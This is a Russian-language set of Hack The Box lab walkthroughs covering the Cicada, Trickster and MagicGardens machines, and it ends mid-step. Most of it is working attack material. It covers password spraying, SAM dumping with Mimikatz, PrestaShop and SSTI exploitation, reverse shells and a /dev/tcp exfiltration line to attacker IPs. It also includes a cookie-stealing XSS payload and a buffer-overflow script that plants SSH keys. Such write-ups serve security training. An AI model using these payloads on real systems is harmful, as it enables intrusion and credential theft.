   Первым делом обратим внимание на описание учетных записей поль‐
зователей,  поскольку там  часто можно  найти интересную информацию.
Для получения важной информации о пользователях применяем параметр --
users.


nxc smb 10.10.11.35 -u michael.wrightson -p
'Cicada$M6Corpb*@Lp#nZp!8' --users





                  Информация о пользователях домена

В описании учетной записи david.orelious находим еще один пароль. Его
тоже прогоняем по всем логинам.


nxc smb 10.10.11.35 -u users.txt -p 'aRt$Lp#7t*VQ!3'
--continue-on-success




                        Результат подбора логина к паролю

Однако  получаем  подтверждение  только  для  учетной  записи  david.
orelious.


ПРОДВИЖЕНИЕ

Так как мы компрометируем новые учетные записи, стоит обязательно про‐
верить их права на общие SMB-ресурсы. От имени пользователя michael.
wrightson ничего нового не увидим, а вот учетной записи david.orelious
доступен для чтения общий каталог DEV.


nxc smb 10.10.11.35 -u michael.wrightson -p
'Cicada$M6Corpb*@Lp#nZp!8' --shares





           Проверка прав от имени пользователя michael.wrightson


nxc smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares





             Проверка прав от имени пользователя david.orelious

Подключаемся к SMB и проверяем содержимое. В каталоге DEV находится
скрипт на PowerShell, который мы, конечно же, забираем на локальную
машину для анализа.


smbclient.py 'cicada.htb/david.orelious:aRt$Lp#7t*VQ!3'@10.10.11.35





                      Загрузка файла Backup_script.ps1





                  Содержимое файла Backup_script.ps1

Скрипт архивирует каталог C:\smb и кладет архив в D:\Backup. В этом скрип‐
те есть креды учетной записи emily.oscars, которые никак не используются.
Спреим найденный пароль по всем пользователям и валидируем всего одну
учетную запись.


nxc smb 10.10.11.35 -u users.txt -p 'Q!3@Lp#M6b*7t*Vt'
--continue-on-success




                        Результат подбора логина к паролю

Проверим, нет ли у этой  учетки возможности управления через службу
WinRM. NetExec поддерживает в том числе и протокол WinRM.


nxc winrm 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'



                  Валидация учетной записи в службе WinRM

Получаем сессию через Evil-WinRM и добываем первый флаг.


evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'




                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Получим информацию о пользователе, его привилегиях и группах с помощью
команды whoami /all.





                       Информация о пользователе

Пользователь состоит в группе Backup Operators, и у него активна привиле‐
гия SeBackupPrivilege. Эта привилегия позволяет процессу получить доступ
к любому файлу в системе для резервного копирования в режиме обхода
списков управления доступом (ACL). SeBackupPrivilege опасна и позволяет
нам сдампить такие файлы, как SAM и SYSTEM. Из файла SAM можно извлечь
зашифрованные хеши паролей учетных записей, а из SYSTEM — ключи
для расшифрования этих хешей. Скопируем файлы из реестра HKLM.


reg save hklm\sam .\sam
reg save hklm\system .\system





                      Копирование файлов из реестра

А теперь используем известную утилиту Mimikatz для получения локальных
учетных данных.


.\mimi.exe "lsadump::sam /sam:sam /system:system"





                     Дамп учетных данных

В выводе находим хеш пароля учетной записи Administrator и с его помощью
авторизуемся в службе WinRM.


evil-winrm -i 10.10.11.35 -u Administrator -H
2b87e7c93a3e8a0ea4a581937016f341





                           Флаг рута

Машина захвачена!
ВЗЛОМ





Сегодня я покажу разные методы побега
из Docker, которые могут использоваться
при пентестах. Также мы проэксплуатируем
баг в движке интернет‑магазина PrestaShop
и используем уязвимость SSTI в сервисе             RalfHacker                                                                                             hackerralf8@gmail.com
ChangeDetection.


Наша цель — получение прав суперпользователя на машине Trickster с учеб‐
ной площадки Hack The Box. Уровень сложности задания — средний.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.34    trickster.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб‑сервер Apache 2.4.52.

Скоуп очень маленький, поэтому сразу идем смотреть сайт.





                           Главная страница сайта


ТОЧКА ВХОДА

Сайт одностраничный, поэтому все ссылки в меню нерабочие, кроме пос‐
ледней, которая ведет на другой домен — shop.trickster.htb.





                      Ошибка обращения к сайту

Обновим запись в файле /etc/hosts, а затем обновим и страницу в браузе‐
ре.


10.10.11.34 trickster.htb shop.trickster.htb





                           Главная страница сайта

На сайте ничего интересного найти не удалось, поэтому поищем, нет ли
скрытых страниц и каталогов.

Справка: сканирование веба c feroxbuster
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или  ffuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -d — глубина сканирования.



Задаем все параметры и запускаем сканирование:


feroxbuster -u http://shop.trickster.htb -w files_interesting.txt -d
1 -t 128





                        Результат сканирования каталогов

Среди каталогов видим .git, и это отличная находка для атакующего!
С помощью git-dumper попробуем сдампить репозиторий.


git-dumper http://shop.trickster.htb/.git/ ./shop/





                      Дамп репозитория

В репозитории всего один коммит, а значит, стоит заглянуть в исходный код.
Это похоже на какую‑то CMS, причем с очень  интересным  каталогом
админки: /admin634ewutrx1jgitlooaj.





                        Содержимое репозитория

Переходим к админке и видим, что имеем дело с PrestaShop версии 8.1.5.





                    Страница авторизации PrestaShop


             INFO

                   Об атаке на PrestaShop в рамках реального пен‐
                         теста читай в статье «Громим PrestaShop. Как я
                           захватил инсталл интернет‑магазина на багбаун‐
                         ти».



ТОЧКА ОПОРЫ

Давай посмотрим, есть ли для этой версии PrestaShop готовые эксплоиты.





                         Поиск эксплоитов в Google

Из Google быстро узнаём, что PrestaShop 8.1.5 уязвима к CVE-2024-34716
и атака может привести к удаленному выполнению кода. Работает это так:
если на страницу /contact-us отправить вложение в формате PNG со встро‐
енным кодом на JavaScript, то при просмотре в браузере код выполнится.
С помощью кода на JS выполняется запрос к панели администрирования:


/admin/index.php/improve/design/themes/import

В результате импортируется модуль с PHP-нагрузкой, которая приводит
к RCE. Все это уже реализовано в эксплоите.





                            Инструкция к эксплоиту

Однако для эксплуатации нужно указать почтовый адрес. Его найдем на стра‐
нице интернет‑магазина.





                            Меню сайта

Запускаем эксплоит, указав необходимые параметры, и через несколько
секунд получаем сессию пользователя Linux на веб‑сервере.


python3 exploit.py --url http://shop.trickster.htb --email
admin@trickster.htb --local-ip 10.10.16.37 --admin-path
admin634ewutrx1jgitlooaj





                             Эксплуатация уязвимости



                           Сессия пользователя


ПРОДВИЖЕНИЕ

Пользователь james
Так как мы работаем от имени службы веб‑сервера и на нем развернуто
веб‑приложение, попробуем получить максимальное количество  учетных
данных. Первым делом просмотрим файл, в котором обычно содержится
информация для подключения к базе данных.


cat /var/www/prestashop/app/config/parameters.php





                    Содержимое файла parameters.php

Чтобы работать с базой данных, нужна интерактивная командная оболочка.
Для этого запускаем листенер (pwncat-cs -lp 4321) и выполняем обычный
реверс‑шелл, закодированный в Base64.


echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNy80MzIxIDA+JjE= |
base64 -d | bash

Когда сессия pwncat будет создана, подключимся к MySQL и просмотрим,
какие есть базы данных.


mysql -h 127.0.0.1 -u ps_user -p'prest@shop_o'


show databases;





                                Базы данных

Нас интересует база prestashop, получим из нее таблицы.


use prestashop;
show tables;





                        Таблицы в базе prestashop

Скорее всего, нам нужна таблица ps_employee. Получим все данные из нее.


select * from ps_employee;





                     Данные в таблице ps_employee

Теперь у нас на руках два хеша bcrypt. Отправляем хеш пользователя james
в hashcat на перебор по словарю.


hashcat '$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/
OzGw9UHi4UnlK6yG5LyunCmm' rockyou.txt

Утилита не распознала алгоритм хеширования и предложила несколько вари‐
антов.





                           Режимы hashcat

Снова запустим hashcat, но в этот раз указываем режим 3200.


hashcat -m 3200 '$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/
OzGw9UHi4UnlK6yG5LyunCmm' rockyou.txt





                             Результат подбора пароля

У пользователя, пароль которого мы получили, есть командная оболочка
в системе.


cat /etc/passwd | grep bash




                    Пользователи с командной оболочкой

Авторизуемся по SSH и забираем первый флаг.





                       Флаг пользователя




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

      HTB TRICKSTER
           ПРОБИРАЕМСЯ К РУТУ ЧЕРЕЗ
                PRESTASHOP И DOCKER





RCE in Docker
Теперь нам необходимо собрать информацию. Я обычно использую для это‐
го скрипты PEASS.


Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Загрузим на удаленный хост скрипт для Linux, дадим ему право на выпол‐
нение и запустим сканирование. В выводе много информации, но выделить
что‑то особенное не удалось. Однако на хосте работают Docker-контейнеры,
поэтому мы можем просканировать сеть с интерфейса docker0.





                          Сетевые интерфейсы

Загружаем на хост бинарь Nmap и определяем в сети живые хосты.


./nmap 172.17.0.1/24 -sn





                           Результат сканирования сети

Теперь сканируем первые 10 000 портов на хосте 172.17.0.2.


./nmap -p 1-10000 172.17.0.2





                          Результат сканирования портов

И находим среди них всего один открытый. Чтобы получить к нему доступ, нам
нужно будет «прокинуть» порт 5000 на свой хост с помощью SSH.


ssh -L 5000:172.17.0.2:5000 james@trickster.htb

В результате весь трафик, который мы пошлем на локальный порт 5000, будет
туннелирован на порт 5000 указанного хоста (в данном случае 172.17.0.2)
через SSH-хост.
   Теперь просмотрим сайт через браузер. Нас встречает страница авто‐
ризации ChangeDetection 0.45.20.





                          Страница авторизации

А раз мы снова столкнулись с каким‑то хоть сколько‑то популярным софтом
и знаем его версию, нужно сразу поискать, нет ли для него известных уяз‐
вимостей.





                         Поиск эксплоитов в Google

Так мы узнаём, что в нашей версии ChangeDetection есть уязвимость SSTI —
включения шаблонов на стороне сервера.


Справка: Server-Side Template Injection
Server-Side Template Injection (SSTI), или инъекция шаблонов на стороне сер‐
вера, — это механизм атаки, при котором злоумышленник внедряет в шаблон
вредоносный код. Шаблоны нужны веб‑разработчикам, чтобы можно было
настраивать внешний вид сайта только в одном месте и затем не копировать
вручную. По сути, шаблон — это документ HTML, где в нужных местах отме‐
чены переменные и команды, которые при генерации итоговой страницы
будут заменены данными. В том числе это могут быть и данные, полученные
от посетителя сайта.
   Атака затрагивает момент, когда присланная информация объединяется
с шаблоном. Злоумышленник формирует строку таким образом, чтобы она
не просто подставилась в шаблон, а была интерпретирована как код. Если
это возможно, то он добавит свои директивы, с помощью которых выполнит
эксфильтрацию данных или даже захват веб‑сервера.



Для  эксплуатации нам понадобится авторизоваться на сервисе. У меня
это получилось сделать с помощью пароля пользователя james.





                          Главная страница сервиса

Перейдем  к изменению любой из записей. Нас  интересуют  настройки
Notifications.  Указываем  URL,  заголовок  уведомления  и  нагрузку  SSTI
с реверс‑шеллом — в тексте уведомления.


{{ self.__init__.__globals__.__builtins__.__import__('os').system('
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET
,socket.SOCK_STREAM);s.connect(("10.10.16.37",4321));os.dup2(s.fileno
(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.
spawn("sh")'') }}

Затем запускаем листенер у себя (снова pwncat-cs -lp 4321) и отправляем
уведомление в тестовом режиме. В окне листенера получаем привилегиро‐
ванную сессию в контейнере Docker.





                                Эксплуатация SSTI





                               Сессия root


Docker credentials dumping
У нас рут в «Докере», а значит, нужно изучить, что есть в файловой системе.
В каталоге /datastore/Backups находим бэкапы ChangeDetection.





                          Бэкапы ChangeDetection

Чтобы получить файл из удаленного контейнера, можем использовать netcat.
Для этого вывод с netcat на локальной машине перенаправляем в файл.


nc -l -p 4444 -q 1 > changedetection-backup-20240830194841.zip

В контейнере же содержимое файла направляем в соответствующий сокет.


cat changedetection-backup-20240830194841.zip > /dev/tcp/10.10.16.37/
4444

Так сохраняем архив на локальную машину и находим какой‑то файл .txt.br.





                          Содержимое архива

Это формат Brotli, который можно преобразовать на онлайновом сервисе
myl.moe.





                            Декодирование файла

В декодированном файле находим учетные данные пользователя adam.





                  Содержимое декодированного файла

С полученными учетными данными удается подключиться по SSH.



                        Сессия пользователя adam


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Разведку мы уже проводили, поэтому остается не так много интересных мест,
которые можно проверить в поисках пути для повышения привилегий. Первое
из них — это файл sudoers. Просматриваем его через sudo -l.





                               Настройки sudoers

Приложение /opt/PrusaSlicer/prusaslicer можно выполнять в привиле‐
гированном контексте без ввода пароля. Сразу проверим, нет ли для этой
утилиты эксплоитов или техник GTFOBins.





                  Поиск эксплоитов для PrusaSlicer в Google

Узнаём, что в PrusaSlicer 2.6.1 есть RCE — уязвимость выполнения про‐
извольного кода. Проверим версию утилиты на хосте.





                               Справка help

На хосте как раз подходящая версия, поэтому разберемся с уязвимостью.
Как следует из описания Exploit DB, файл проекта PrusaSlicer 3mf представ‐
ляет собой ZIP-архив и содержит файл Metadata/Slic3r_PE.config с нас‐
тройками проекта. Настройка post_process указывает команду постобработки
проекта, которая выполнится в терминале при экспорте G-кода.





                         Описание уязвимости

Я поискал в интернете примеры файлов 3mf и использовал первый попав‐
шийся. Распаковываем ZIP, открываем файл Metadata/Slic3r_PE.config,
находим настройку post_process и записываем туда команду chmod u+s /
bin/bash. Она назначит S-бит файлу командной оболочки bash.



                    Содержимое файла конфигураций

Архивируем  проект обратно, копируем его файл на  удаленный сервер
и выполняем экспорт G-кода, конечно же, через sudo. После завершения
работы утилиты обнаружим, что файл /bin/bash получил S-бит.


sudo /opt/PrusaSlicer/prusaslicer -s skull_2.3mf





                             Эксплуатация уязвимости


Справка: бит SUID
Когда у файла установлен атрибут setuid (S-атрибут), обычный пользователь,
запускающий этот файл, получает повышение прав до пользователя — вла‐
дельца файла в рамках запущенного процесса. После получения повышенных
прав приложение может выполнять задачи, которые недоступны обычному
пользователю. Из‑за возможности состояния гонки многие операционные
системы игнорируют S-атрибут, установленный shell-скриптам.


Теперь мы можем запустить новую оболочку от имени пользователя root.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





Переполнение буфера — классическая уяз‐
вимость,  знание  которой  по‑прежнему
иногда  пригождается.  Но  прежде  чем
доберемся до уязвимого приложения, зах‐
ватим админку Django, украв куки через             RalfHacker                                                                                             hackerralf8@gmail.com
XSS. Также нам предстоит провести атаку
через механизм Pickle в Python и сбежать
из Docker.


Наша  главная цель —  получение прав  суперпользователя на машине
MagicGardens с  учебной  площадки Hack The Box.  Уровень  сложности
задания — «безумный».


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.9    magicgardens.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел четыре открытых порта:
 • 22 — служба OpenSSH 9.2p1;
 • 80 — веб‑сервер Nginx 1.22.1;
 • 1337 — неизвестная служба;
 • 5000 — служба Docker Registry.

Docker Registry использует HTTP-аутентификацию, учетных данных от SSH
у нас пока нет, поэтому начинаем с изучения доступного нам веб‑сайта.





                           Главная страница сайта


ТОЧКА ВХОДА

На сайте ничего интересного найти не удалось, поэтому приступим к ска‐
нированию.

Справка: сканирование веба c feroxbuster
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или  ffuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -d — глубина сканирования.



Задаем все параметры и запускаем сканирование:


feroxbuster -u http://magicgardens.htb/ -w directory_2.3_medium_
lowercase.txt -d 1 -t 128





                        Результат сканирования каталогов

В числе прочего находим админку Django на странице /admin.





                      Содержимое страницы /admin

Также на сайте есть возможность авторизации и регистрации.





                         Форма авторизации

Авторизованному  пользователю  всегда  доступно больше  возможностей,
поэтому сразу же регистрируемся. Теперь нам доступны такие функции,
как выбор товаров и даже система подписки — что‑то вроде получения пос‐
тоянной скидки на товары.





                          Страница Subscription





                     Сообщение о запросе подписки

Судя по сообщению на странице, после подтверждения банка мы должны
были  получить  QR-код,  однако  ничего  такого не  произошло. А еще
при выборе товара нам придет сообщение от какого‑то morty, который
говорит, что если отправим ему QR-код, то получим свою скидку.





                         Входящие сообщения

Перейдем к Burp History и пройдемся по запросам в поисках чего‑нибудь
аномального и интересного. Например, в запросе к банку в параметре bank
указан какой‑то адрес.





                           Запрос в Burp History

Запустим листенер на порте 80, перенаправим запрос в Burp Repeater
и укажем в параметре bank адрес своего сервера.





                          Запрос в Burp Repeater





                                 Логи листенера

Листенер засечет HTTP-запрос с сервера. Так как никакого  ответа мы
не отправили, на сервере отображено не такое сообщение, как раньше.





                    Сообщение о недоступности банка

То есть, если мы ответим серверу, сможем получить нужный QR-код.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
   HTB MAGICGARDENS
        ЭКСПЛУАТИРУЕМ ПЕРЕПОЛНЕНИЕ
                БУФЕРА И ПОВЫШАЕМ
                 ПРИВИЛЕГИИ В LINUX





ТОЧКА ОПОРЫ

Сделаем на Python сервер, который будет отвечать на запрос к /api/
payments/.


from flask import Flask, jsonify, request


app = Flask(__name__)


@app.route('/api/payments/', methods=['POST'])
def func_payment():
    r_json = request.get_json()
    r_json['status'] = "200"
    return jsonify(r_json)


app.run(host='0.0.0.0', port=80, debug=True)

Запускаем код, а затем повторяем запрос с подменой адреса своим.





                                  Логи сервера





                         Сообщение на странице

Теперь получаем сообщение, что подписка в обработке, а при обновлении
страницы появляется желанный QR-код.





                          Страница Subscription

Расшифруем QR-код, чтобы понимать, какие данные он хранит.





                          Декодированный QR-код

Скорее всего, morty проверяет имя пользователя, когда декодирует QR-код.
Попробуем вместо имени аккаунта подставить код на JavaScript. Превратить
его в QR можно при помощи онлайнового генератора.


3cca634013591eb51173fb6207572e37.0d341bcdc6746f1d452b3f4de32357b9.<
img src= x onerror=this.src='http://10.10.16.51/?c='+document.cookie>

Этот код отправит на наш сервер cookie пользователя. Запускаем листенер
(nc -nlvp 80) и отправляем в ответном сообщении пользователю morty сге‐
нерированный QR-код. Почти сразу получаем запрос с сессионным иден‐
тификатором пользователя.





                                 Логи листенера

В хранилище браузера подставляем полученный sessionid и обновляем
страницу. Таким образом мы захватываем аккаунт morty.





                      Профиль пользователя morty

Переходим на страницу /admin и получаем доступ к настройкам Django.





                   Страница администрирования Django

Среди параметров аккаунта пользователя morty есть и хеш его пароля.





                    Информация о пользователе morty

Ломаем хеш с помощью hashcat и используем полученные учетные данные
для входа на сервер по SSH.


hashcat 'pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j$e7bq8dE/
U+yIiZ8isA0Dc0wuL0gYI3GjmmdzNU+Nl7I=' rockyou.txt





                            Результат перебора пароля




                        Сессия пользователя morty




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
   HTB MAGICGARDENS
        ЭКСПЛУАТИРУЕМ ПЕРЕПОЛНЕНИЕ
                БУФЕРА И ПОВЫШАЕМ
                 ПРИВИЛЕГИИ В LINUX





ПРОДВИЖЕНИЕ

Мы в системе, а значит, нужно собрать информацию о ней. Я буду исполь‐
зовать для этого скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Загрузим скрипт на удаленный хост, дадим право на выполнение и запустим
сканирование. А затем смотрим, что удалось найти.
  На хосте есть Docker, однако мы не в контейнере.





                       Информация о контейнерах

Среди запущенных процессов есть какой‑то harvest server, работающий
в контексте пользователя alex.




                            Список процессов

Пользователь alex состоит в большом количестве групп.



                        Список всех пользователей

У пользователя alex есть входящие сообщения.





                       Список входящих сообщений

Информации отобрали много, однако она вся про другого пользователя.
Перейти к Алексу можно только через уязвимость в сервере harvest. Скачива‐
ем исполняемый файл на свою машину для анализа.





                    Меню Help приложения harvest

Запустим серверную часть и проверим прослушиваемые порты. Так узнаем,
что приложение прослушивает порт 1337.


./harvest server -i eth0


netstat -an





                        Прослушиваемые порты

Я подключился к этому порту через netcat, отправил тестовые данные
и получил сообщение о неверном хендшейке.





                           Проверка работы сервера

Сервер как‑то проверяет полученные данные. Чтобы понять, как он это дела‐
ет, проанализируем файл в декомпиляторе. В IDA Pro комбинацией клавиш
Shift-F12 отобразим все строки в исполняемом файле. Найдем строку [x]
Handshake error и перейдем к месту ее использования в коде программы.
Так    мы      получаем      декомпилированный     код      функции
harvest_handshake_server.





              Декомпилированный код harvest_handshake_server

В этой функции полученная строка сравнивается со строкой harvest v...
(строка 17). Чтобы получить полную строку, с которой производится срав‐
нение, запустим сервер в ltrace.


ltrace ./harvest server -i eth0


echo "harvest v123" | nc localhost 1337





                                   Логи ltrace

В функциях strlen и strcmp можно увидеть валидную строку. Отправим ее
серверу и в ответ получим какие‑то данные о сети. Значит, проверка прой‐
дена.


echo "harvest v1.0.3" | nc localhost 1337





                        Полученные с сервера данные

Вернемся  к  декомпилятору.  После harvest_handshake_server  следует
вызов функции handle_raw_packets, в которой в зависимости от получен‐
ного   сетевого   пакета   происходит  вызов   функций  print_packet
или log_packet (строки 47–51).





                 Декомпилированный код handle_raw_packets

Функция print_packet отправит данные обратно клиенту. Судя по формату,
именно их мы получили ранее.





                    Декомпилированный код print_packet

А вот функция log_packet выводит данные в файл. Формат данных и имя
файла заданы статически, с ограниченным размером (строки 4 и 5).





                     Декомпилированный код log_packet

Сразу обратим внимание на неконтролируемое копирование данных в огра‐
ниченный по размеру массив в строке 11, здесь потенциальное перепол‐
нение буфера. Давай в этом убедимся.


Переполнение буфера
Первым делом нам нужно определить смещение, достаточное для переза‐
писи данных в памяти. Для этого можно сгенерировать последовательность
де Брёйна длиной 65 500 байт. Она поможет быстро вычислять размеры
используемых буферов.


msf-pattern_create 65500 > s.txt

Давай набросаем на Python скрипт, который автоматически будет открывать
соединение с сервером и отправлять данные из файла.


import socket
import os


os.system('echo "harvest v1.0.3" | nc 127.0.0.1 1337')


address6 = ('::1', 1337)
s6 = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s6.connect(address6)


data = ''
with open('s.txt', 'rb') as f:
   data = bytearray(f.read())


s6.send(data)

Теперь, если запустить серверную часть, а затем выполнить скрипт, прог‐
рамма аварийно завершится с ошибками, а в текущем каталоге появится
непонятный файл. При этом в файле также присутствуют данные из сгенери‐
рованной последовательности.



                          Содержимое каталога





                           Содержимое файла

Таким образом, если сформировать данные в определенном формате, то
можно будет создать на сервере файл с определенным названием и содер‐
жимым. Запустим серверную часть в strace и выполним эксплоит. Затем
в логах strace найдем функцию открытия файла.





                                   Логи strace

Во втором параметре функции передается имя файла. По первым четырем
символам мы сможем определить смещение подстроки в общей последова‐
тельности де Брёйна.


msf-pattern_offset -l 65500 -q Fu8F





                         Определение смещения

Таким образом, мы можем записать имя файла по смещению 65 364 + 8.
Изменим эксплоит так, чтобы на сервере создавался файл с именем id_rsa
(мы сможем записать туда известный нам приватный ключ SSH, который поз‐
волит нам авторизоваться).


import socket
import os


os.system('echo "harvest v1.0.3" | nc 127.0.0.1 1337')


address6 = ('::1', 1337)
s6 = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s6.connect(address6)


data = ''
with open('s.txt', 'rb') as f:
    data = bytearray(f.read())


data = data[:65364 + 8] + b"id_rsa"


s6.send(data)





                            Запись файла id_rsa

Файл id_rsa успешно  создан.  Теперь похожим  образом  определим,
по какому смещению находятся данные, которые попадают в файл.


msf-pattern_offset -l 65500 -q Aa4A





                         Определение смещения

В файл попадают почти все данные, поэтому возьмем за основу сме‐
щение 12. Сгенерируем ключ SSH и поместим его по смещению 12. Строка
с ключом должна завершаться символом /n. Также заменим тестовый файл
id_rsa полным путем /home/user/.ssh/authorized_keys.


import socket
import os


os.system('echo "harvest v1.0.3" | nc 127.0.0.1 1337')


address6 = ('::1', 1337)
s6 = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s6.connect(address6)


data = ''
with open('s.txt', 'rb') as f:
    data = bytearray(f.read())


ssh_key = ''
with open('id_rsa.pub', 'rb') as k:
    ssh_key = bytearray(k.read())
ssh_key += b"\n"


data = data[:12] + ssh_key + data[12 + len(ssh_key) : 65364 + 8] + b"
/home/user/.ssh/authorized_keys"


s6.send(data)





                       Запись в файл authorized_keys

Эксплоит отработал успешно, SSH-ключ записан. Переносим его на сервер
MagicGardens и выполняем.


import socket
import os


os.system('echo "harvest v1.0.3" | ./nc 127.0.0.1 1337')


address6 = ('::1', 1337)
s6 = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s6.connect(address6)


ssh_key = b'ssh-ed25519
AAAAC3NzaC1lZDI1NTE5AAAAIOrhbgmrpDGWBmvl8HgrA1wTPJ/JGIgz6248rZSR7Ogv
ralf@hacker'
ssh_key += b"\n"


data = b"A"*12
data += ssh_key
data += b"A"*(65364 + 8 - 12 - len(ssh_key))
data += b"/home/alex/.ssh/authorized_keys"


s6.send(data)

Затем подключаемся к серверу по SSH с приватным ключом и читаем первый
флаг.




                       Флаг пользователя




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

   HTB MAGICGARDENS
        ЭКСПЛУАТИРУЕМ ПЕРЕПОЛНЕНИЕ
                БУФЕРА И ПОВЫШАЕМ
                 ПРИВИЛЕГИИ В LINUX





ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Получив сессию пользователя alex, первым делом проверим найденное
ранее входящее сообщение /var/mail/alex.





                    Содержимое файла /var/mail/alex

В  сообщении  передавалось  вложение  auth.zip.  Декодируем  данные
из Base64 и открываем архив.


cat auth.zip.b64 | base64 -d > auth.zip





                       Содержимое файла auth.zip

В архиве — файл с учетными данными для доступа к registry, однако сам архив
запаролен. С помощью zip2john получаем хеш пароля, который затем под‐
бираем с помощью hashcat.


hashcat -m 17210 --username zip_hash rockyou.txt





                             Результат подбора пароля

После извлечения файла passwd переберем хеш пароля из него.



                       Содержимое файла passwd


hashcat -m 3200 --username htpasswd rockyou.txt





                             Результат подбора пароля

Теперь с помощью DockerRegistryGrabber получим список репозиториев.


python3 drg.py https://10.10.11.9 -U alex -P diamonds --list



                           Список репозиториев

Сдампим все содержимое, для чего укажем параметр --dump_all.


python3 drg.py https://10.10.11.9 -U alex -P diamonds --dump_all





                      Дамп репозиториев

После распаковки всех архивов и быстрого анализа находим в файле .env
в каталоге 4803...64fb секретный ключ Django.



                         Содержимое файла .env

В том же репозитории находим подключение модуля PickleSerializer.




                        Настройки фреймворка Django


PickleSerializer RCE
Pickle — это модуль Python, который применяется для сериализации данных,
но, в отличие от JSON или YAML, он позволяет сериализовать целые объекты
вместе со свойствами и методами. Опасность здесь в том, что можно сери‐
ализовать объект с вредоносным кодом в методе __reduce__(), который
сработает при распаковке объекта.
   Установим django-docker-template, после чего перейдем в интерактивную
консоль Python.


git clone https://github.com/amerkurev/django-docker-template.git
cd django-docker-template


sudo docker build -t django-docker-template:master .
sudo docker run --rm django-docker-template:master python manage.py
test
docker run -it --rm -v sqlite:/sqlite django-docker-template:master
python manage.py shell

Теперь создаем и сериализуем объект, в методе __reduce__ которого
выполняем вот такой реверс‑шелл:


/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.87/4321 0>&1'

Только предварительно закодируем его в Base64.


from django.contrib.sessions.serializers import PickleSerializer
